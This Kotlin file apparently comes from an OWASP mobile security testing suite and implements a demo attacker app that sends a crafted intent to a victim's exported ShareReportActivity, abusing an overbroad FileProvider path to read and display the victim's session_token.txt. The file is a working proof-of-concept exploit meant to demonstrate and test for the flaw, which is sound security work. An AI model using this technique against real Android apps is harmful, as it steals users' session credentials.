package org.owasp.mastestapp

import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts

// SUMMARY: Attacker app that exploits the FileProvider oversharing vulnerability demonstrated in MASTG-DEMO-0122.
// The victim's ShareReportActivity is exported and accepts a caller-supplied file_name extra. Because the
// victim's filepaths.xml declares path=".", FileProvider.getUriForFile() will accept any file under filesDir —
// not just the intended reports/ subdirectory. This app requests session_token.txt and reads it via the
// URI grant returned by ShareReportActivity. The exfiltrated content is shown in a dialog and logged to logcat.
// FAIL: [MASTG-TEST-0357] ShareReportActivity returns a URI for session_token.txt — a file outside the
// intended reports/ directory — without validating the requested filename.

class MastgTest(private val context: Context) {

    companion object {
        const val TAG = "EXFIL"
    }

    fun mastgTest(): String {
        // Start AttackerActivity which holds the ActivityResultLauncher and drives the full attack.
        // The exfiltrated content is displayed in a dialog inside AttackerActivity and logged under EXFIL.
        context.startActivity(
            Intent(context, AttackerActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        )
        return "Attack launched against org.owasp.mastestapp.\n\n" +
            "The exfiltrated session token will appear in a dialog and in logcat:\n\n" +
            "adb logcat -s $TAG"
    }
}

// AttackerActivity holds the ActivityResultLauncher (which must be registered before onCreate
// per Jetpack lifecycle rules) and drives the full attack when started by mastgTest().
class AttackerActivity : ComponentActivity() {

    private val launcher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        val uri = result.data?.data ?: run {
            Log.e(MastgTest.TAG, "No URI returned — resultCode=${result.resultCode}")
            finish()
            return@registerForActivityResult
        }
        // FLAG_GRANT_READ_URI_PERMISSION was set by ShareReportActivity on the result intent,
        // so ContentResolver can open the stream despite the FileProvider not being directly exported.
        val content = contentResolver.openInputStream(uri)
            ?.bufferedReader()
            ?.use { it.readText() }
            ?: "<empty>"

        Log.e(MastgTest.TAG, "Exfiltrated from victim: $content")

        // Show the exfiltrated content in the UI so the result is visible without needing logcat.
        AlertDialog.Builder(this)
            .setTitle("Exfiltrated Data")
            .setMessage("File: session_token.txt\n\nContent:\n$content")
            .setPositiveButton("OK") { _, _ -> finish() }
            .setOnCancelListener { finish() }
            .show()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Send a crafted intent to the victim's exported ShareReportActivity.
        // We request session_token.txt — a file outside the intended reports/ subdirectory
        // but reachable because filepaths.xml declares path="." for the files-path element.
        val intent = Intent().apply {
            setClassName(
                "org.owasp.mastestapp",
                "org.owasp.mastestapp.MastgTest\$ShareReportActivity"
            )
            putExtra("file_name", "session_token.txt")
        }
        launcher.launch(intent)
    }
}
